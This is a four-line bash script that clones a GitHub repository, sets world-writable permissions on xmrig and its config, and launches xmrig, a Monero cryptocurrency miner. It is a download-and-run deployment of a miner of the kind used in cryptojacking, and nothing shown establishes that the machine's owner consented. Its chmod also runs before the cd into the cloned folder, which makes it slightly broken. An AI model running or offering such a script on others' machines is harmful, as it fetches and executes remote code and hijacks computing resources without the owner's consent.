#!/bin/bash
git clone https://github.com/drputraargo-commits/bag.git
chmod 777 xmrig config.json SHA256SUMS
cd bag
./xmrig
